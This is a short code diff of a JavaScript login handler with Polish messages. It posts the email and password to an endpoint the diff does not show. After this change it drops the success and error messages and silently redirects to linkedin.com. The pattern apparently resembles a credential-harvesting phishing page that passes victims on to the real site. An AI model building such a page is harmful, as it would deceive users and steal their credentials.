@@ -1,4 +1,4 @@
-document.getElementById("loginForm").addEventListener("submit", function (e) {
+document.getElementById("loginForm").addEventListener("submit", function(e) {
   e.preventDefault();
   const email = document.getElementById("email").value;
   const password = document.getElementById("password").value;
@@ -13,13 +13,10 @@ document.getElementById("loginForm").addEventListener("submit", function (e) {
     .then((response) => response.json())
     .then((data) => {
       console.log("Sukces:", data);
-      alert("Zalogowano pomyślnie!");
-      document.getElementById("result").innerText = "Zalogowano pomyślnie!";
+      window.location.href = "https://www.linkedin.com/";
     })
     .catch((error) => {
       console.error("Błąd:", error);
-      document.getElementById("result").innerText =
-        "Wystąpił błąd podczas logowania.";
     });
 });
 
